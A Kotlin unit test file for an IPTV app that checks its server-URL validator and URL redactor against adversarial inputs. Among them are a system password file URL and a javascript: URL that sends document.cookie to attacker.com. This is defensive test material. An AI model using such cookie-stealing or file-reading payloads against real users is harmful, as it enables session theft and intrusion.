package com.example.calmsource.feature.iptv

import kotlinx.coroutines.runBlocking
import org.junit.Assert.*
import org.junit.Test
import com.example.calmsource.core.network.UrlRedactor
import java.net.URI

class IPTVAdversarialUrlTest {

    @Test
    fun testXtreamAdversarialServerUrls() {
        val badUrls = listOf(
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==",
            "http://example.com/live?token=secret  ",
            "",
            "   ",
            "https://" + "a".repeat(5000) + ".com",
            "http://example.com/foo\\bar"
        )
        
        for (url in badUrls) {
            val error = XtreamRepository.validateServerUrl(url)
            // If it returns an error, it is correctly blocking.
            // If it returns null, it thinks it's valid.
            println("URL: $url -> Error: $error")
        }
    }

    @Test
    fun testUrlRedactorWithMalformedUrls() {
        val malformedUrls = listOf(
            "http://example.com/?token=12345&apikey=secret password",
            "https://example.com:8080/live/user/pass/123.ts",
            "xtream://stream_id/12345",
            "file:///data/data/com.example.app/databases/iptv.db",
            "javascript:fetch('http://attacker.com/?cookie='+document.cookie)",
            "http://[::1]/live/username/password/1.ts"
        )

        for (url in malformedUrls) {
            val redacted = UrlRedactor.redactUrl(url)
            println("Original: $url -> Redacted: $redacted")
            assertFalse("Should not leak password", redacted.contains("password", ignoreCase = true))
            assertFalse("Should not leak token", redacted.contains("secret", ignoreCase = true))
        }
    }
}
